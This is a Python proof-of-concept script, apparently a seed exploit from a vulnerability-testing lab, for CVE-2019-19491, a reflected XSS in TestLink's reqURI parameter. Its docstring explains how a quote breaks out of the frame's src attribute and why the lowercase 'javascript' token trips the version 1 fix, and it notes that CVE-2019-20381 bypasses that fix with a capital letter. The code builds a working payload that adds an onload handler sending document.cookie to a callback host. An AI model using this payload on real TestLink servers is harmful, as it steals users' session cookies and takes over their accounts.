#!/usr/bin/env python3
"""[GIVEN] CVE-2019-19491 seed exploit -- lowercase `javascript` reqURI reflected XSS (REAL TestLink).

The REAL TestLink index.php::initEnv() reflects the `reqURI` query parameter UNESCAPED into the
main-frame `src` attribute in main.tpl (V0 tag 1.9.19: `<frame src="{$gui->mainframe}" name="mainframe">`
inside a `<frameset>`, matching ExploitDB 47702; V1/V2: `<iframe src="{$gui->mainframe}" name="mainframe">`).
The reflection only renders for an authenticated session (the victim logs in as admin/admin first).
Because the value lands in the double-quoted `src="..."` attribute with no escaping, a `"` closes the
attribute and lets us add an `onload="..."` handler to that same frame/iframe element; when the frame
loads (its `src` 404s harmlessly) the handler fires a beacon that reads document.cookie and
exfiltrates the flag. onload is scheme-independent, so it works on BOTH the V0 `<frame>` and the
V1/V2 `<iframe>` templates and is unaffected by the `$_SESSION['basehref']` prepend the V1 fix added.

The payload LEADS with the lowercase token `javascript` -- exactly what the CVE-2019-19491 guard
keys on. On V0 (no guard) it is reflected raw -> the injected onload fires -> flag exfiltrated. On V1
(=CVE-2019-19491 fix 0e3e90799) `if (strpos($reqURI,'javascript') !== false) $reqURI = null;` matches
the lowercase substring -> reqURI is replaced with `lib/general/mainPage.php` -> nothing is injected
-> BLOCKED (no flag). This is the case-SENSITIVE guard CVE-2019-20381 bypasses with a capitalised
token (bypass_poc is byte-for-byte identical except the leading `j` -> `J`).

(Note: a BARE reflected `javascript:` scheme no longer executes on modern Chromium -- javascript: URLs
in frame/iframe navigation are blocked -- and on V1/V2 it is additionally neutralised by the basehref
prepend. The onload attribute-breakout is the vector that actually executes against the real,
unescaped sink.)
"""
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent))
from poc_common import run_payload, CB  # noqa: E402

# Lowercase token 'javascript' -> caught by the case-SENSITIVE strpos('javascript') guard on V1.
# `"` closes the src attribute; `onload="..."` is appended to the SAME frame/iframe element and fires
# on load (scheme-independent, basehref-proof); the beacon runs in the victim's origin.
ORIGINAL_PAYLOAD = 'javascript" onload="new Image().src=\'' + CB + "'+document.cookie"


def original_poc(*, version="v1"):
    """Run the CVE1 seed on `version`; returns the callback dump (flag present IFF it executed)."""
    return run_payload(ORIGINAL_PAYLOAD, version)


if __name__ == "__main__":
    v = sys.argv[1] if len(sys.argv) > 1 else "v1"
    print(original_poc(version=v))
